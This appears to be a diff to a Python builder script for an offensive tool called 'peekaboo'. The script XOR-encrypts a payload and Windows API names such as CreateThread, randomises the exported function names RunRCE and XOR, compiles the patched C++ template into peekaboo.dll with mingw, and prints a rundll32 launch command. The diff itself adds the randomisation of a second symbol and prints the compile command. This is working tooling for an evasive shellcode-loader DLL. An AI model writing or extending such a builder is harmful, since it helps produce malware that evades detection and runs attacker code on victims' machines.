@@ -100,10 +100,11 @@ def run_peekaboo(host, port):
     f_cth = "CreateThread"
     f_wfso = "WaitForSingleObject"
     f_rce = "RunRCE"
+    f_xor = "XOR"
 
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
     # ciphertext, p_key = encryptor.aes_encrypt(plaintext)
-    f_rce = encryptor.random()
+    f_rce, f_xor = encryptor.random(), encryptor.random()
     ciphertext, p_key = encryptor.xor_encrypt(plaintext)
     ciphertext_va, va_key = encryptor.xor_encrypt(f_va)
     ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp)
@@ -123,6 +124,7 @@ def run_peekaboo(host, port):
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + va_key + '";')
     data = data.replace('RunRCE', f_rce)
+    data = data.replace('XOR', f_xor)
 
     tmp.close()
     tmp = open("peekaboo-enc.cpp", "w+")
@@ -130,11 +132,13 @@ def run_peekaboo(host, port):
     tmp.close()
 
     try:
-        os.system("x86_64-w64-mingw32-g++ -shared -o peekaboo.dll peekaboo-enc.cpp -fpermissive >/dev/null 2>&1")
+        cmd = "x86_64-w64-mingw32-g++ -shared -o peekaboo.dll peekaboo-enc.cpp -fpermissive >/dev/null 2>&1"
+        os.system(cmd)
     except:
         print (Colors.RED + "error compiling template :(" + Colors.ENDC)
         sys.exit()
     else:
+        print (Colors.YELLOW + cmd + Colors.ENDC)
         print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
         print (Colors.GREEN + "rundll32 .\peekaboo.dll, " + f_rce)
 
